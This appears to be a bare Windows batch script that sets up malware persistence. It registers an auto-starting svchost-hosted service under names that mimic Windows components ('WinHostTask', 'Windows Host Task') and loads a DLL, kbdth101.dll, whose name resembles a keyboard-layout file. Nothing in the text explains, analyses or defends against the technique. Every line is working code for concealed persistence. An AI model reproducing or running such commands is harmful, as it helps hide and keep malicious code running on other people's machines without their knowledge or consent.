sc create WinHostTask binPath= "%SystemRoot%\system32\svchost.exe -k WinHostTask" type= share start= auto DisplayName= "Windows Host Task"
sc description WinHostTask "Check Windows Host Task"
reg add HKLM\SYSTEM\CurrentControlSet\services\WinHostTask\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\kbdth101.dll /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v WinHostTask /t REG_MULTI_SZ /d WinHostTask /f
sc start WinHostTask